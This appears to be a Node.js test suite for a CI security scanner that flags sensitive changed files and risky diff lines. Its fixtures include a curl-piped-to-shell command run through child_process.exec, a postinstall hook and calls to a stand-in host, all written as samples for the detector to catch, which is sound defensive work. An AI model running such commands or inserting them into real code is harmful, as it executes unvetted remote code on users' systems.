const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const {
  main,
  scanChangedFiles,
  scanDiffText,
} = require('../core.js');

test('scanChangedFiles marks dependency and deployment files as sensitive', () => {
  const findings = scanChangedFiles([
    'web/app/src/App.tsx',
    'web/pnpm-lock.yaml',
    'api/Cargo.lock',
    '.github/workflows/verify.yml',
    'docker/web/nginx.conf',
  ]);

  assert.deepEqual(findings.map((finding) => finding.file), [
    'web/pnpm-lock.yaml',
    'api/Cargo.lock',
    '.github/workflows/verify.yml',
    'docker/web/nginx.conf',
  ]);
});

test('scanDiffText reports newly added network and execution risks', () => {
  const findings = scanDiffText([
    '+++ b/web/app/src/api.ts',
    '+fetch("http://example.test/callback")',
    '+++ b/scripts/node/release.js',
    '+child_process.exec("curl https://example.test/install.sh | sh")',
  ].join('\n'));

  assert.deepEqual(findings.map((finding) => finding.kind), [
    'insecure-url',
    'javascript-network-call',
    'callback-or-webhook',
    'external-url',
    'process-execution',
  ]);
  assert.equal(findings[0].file, 'web/app/src/api.ts');
});

test('main writes a security-risk report and returns advisory status to CI', async () => {
  const repoRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'oneflowbase-security-risk-'));
  const outputDir = path.join(repoRoot, 'tmp', 'test-governance');
  const stdout = [];
  const stderr = [];

  const status = await main([], {
    repoRoot,
    env: {
      SECURITY_RISK_CHANGED_FILES: [
        'web/app/package.json',
        'web/app/src/api.ts',
      ].join('\n'),
      SECURITY_RISK_DIFF: [
        '+++ b/web/app/package.json',
        '+    "postinstall": "node scripts/install.js"',
        '+++ b/web/app/src/api.ts',
        '+const socket = new WebSocket("wss://example.test/ws");',
      ].join('\n'),
    },
    writeStdout(text) {
      stdout.push(text);
    },
    writeStderr(text) {
      stderr.push(text);
    },
  });

  assert.equal(status, 0);
  assert.match(stdout.join(''), /security-risk\.json/u);
  assert.match(stderr.join(''), /Review 5 risk finding/u);

  const report = JSON.parse(fs.readFileSync(path.join(outputDir, 'security-risk.json'), 'utf8'));
  assert.equal(report.status, 'review_required');
  assert.deepEqual(report.findings.map((finding) => finding.kind), [
    'sensitive-file-changed',
    'install-script',
    'external-url',
    'javascript-network-call',
    'callback-or-webhook',
  ]);
});
